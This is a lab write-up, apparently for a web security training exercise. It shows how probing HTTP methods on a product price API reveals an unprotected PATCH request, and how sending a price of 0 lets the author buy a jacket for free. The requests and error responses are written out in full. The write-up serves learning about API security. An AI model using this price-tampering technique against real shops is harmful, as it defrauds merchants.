# Finding and exploiting an unused API endpoint

Topic :  Finding and exploiting an unused API endpoint

Concept: Recon the API, find the hidden API endpoint and the documentation and exploit the endpt.

End Goal :  Exploiting a hidden API endpoint to buy a **Lightweight l33t Leather Jacket.**

Analysis : 

- First of all we recon the whole API and find a API endpoint.
- The API endpoint found :

```
GET /api/products/1/price HTTP/2
```

- API response to this :

```
{
    "price":"$1337.00",
    "message":"Your neighbor just bought 2 of these! Don't feel left out!"
}
```

- The message keeps getting randomized, everytime.

- Let’s brute force the API endpoint now using gobuster
- Brute forcing doesn’t work in this case
- Let’s mess with the requests sent to the api and take hints from the error messages as said in the description
- Discovery
    - PUT → Method Not Allowed
    - PATCH → Unauthorized (Without body)
    - GET → normal one
    - DELETE → Method Not Allowed
    - OPTIONS → Method Not Allowed
- Only interesting request was PATCH, when i sent a body along with it, it shows this message :

```

{
    "type":"ClientError",
    "code":400,
    "error":"Only 'application/json' Content-Type is supported"
}
```

- The PATCH request to this endpoint is our hidden endpoint.
- This error means we have to include the `Content-Type: application/json` in the header.
- My request :
    
    ```
    PATCH /api/products/1/price HTTP/2

    {
    	"price" : "$12"
    }
    ```
    
- Then again error comes which is

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 98

{
"type":"ClientError",
"code":400,
"error":"'price' parameter must be a valid non-negative integer"
}
```

- So i change the body as follows :
- Adhering to the rules…

```
{
	"price" : 0
}
```

- This changes the price to 0 dollars which i can buy now. And after buying the jacket the lab is succesfully completed.